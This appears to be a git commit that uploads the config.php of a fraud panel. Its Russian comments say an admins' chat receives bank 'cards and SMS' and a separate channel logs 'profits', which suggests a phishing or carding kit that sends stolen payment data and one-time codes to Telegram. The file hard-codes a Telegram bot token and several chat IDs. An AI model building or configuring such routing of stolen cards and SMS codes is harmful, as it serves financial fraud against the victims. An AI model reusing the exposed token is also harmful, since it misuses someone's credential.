c703e2bc8fba6ebc1ce91a800df50c2fdaca6d99
Max <maksymyamkovyi@outlook.com>
2026-03-18 20:49:49 +0200

    Add files via upload

---
+++ config.php
@@ -0,0 +1,12 @@
+<?
+
+// Уведомления в телеграмм канал
+define("tgToken", "8732322114:AAHEjgA7A2nytSOrNnX7XO9XzZKrW__qVR4"); // токен ТГ
+
+define("chatAdmin", "8769344182"); // ID чата админов(приходят карты и смс)
+
+define("chatProfits", "1003807963002"); // ID канала профитов
+
+define("chatErrors", "1003779828937"); // ID канала ошибок
+
+?>
